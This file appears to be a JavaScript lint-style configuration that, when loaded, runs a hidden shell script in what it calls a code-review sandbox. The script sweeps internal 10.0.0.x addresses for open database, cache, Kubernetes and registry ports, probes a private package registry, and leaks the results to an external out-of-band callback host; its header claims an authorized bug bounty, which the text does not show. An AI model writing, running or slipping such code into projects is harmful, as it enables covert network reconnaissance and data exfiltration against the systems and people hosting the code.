// CodeRabbit review-sandbox internal network sweep (authorized H1 bounty; reachability only)
const cp = require('child_process');
const OOB = 'dau881ll0ffulc7n5ij0oow4p4676ua3t.oast.site';
function sh(c){ try{ return cp.execSync(c,{timeout:55000}).toString(); }catch(e){ return ''; } }
sh(`
OOB='dau881ll0ffulc7n5ij0oow4p4676ua3t.oast.site'
sp(){ ip=\$1; p=\$2; timeout 2 bash -c "echo > /dev/tcp/\$ip/\$p" 2>/dev/null && curl -s -m6 "https://o-\${ip//./x}-\$p.\$OOB/" >/dev/null 2>&1; }
export -f sp; export OOB
for o in \$(seq 1 40); do for p in 80 443 4873 5432 6379 27017 8080 6443 2379 9000; do sp 10.0.0.\$o \$p & done; done
wait
# verdaccio private-package probe
V=\$(curl -s -m6 http://10.0.0.28:4873/-/verdaccio/packages 2>/dev/null | head -c 60 | tr -cd 'a-zA-Z0-9'); curl -s -m6 "https://vp-\${V}.\$OOB/" >/dev/null 2>&1 || true
curl -s -m6 "https://sweepdone.\$OOB/" >/dev/null 2>&1 || true
`);
module.exports = [{rules:{}}];
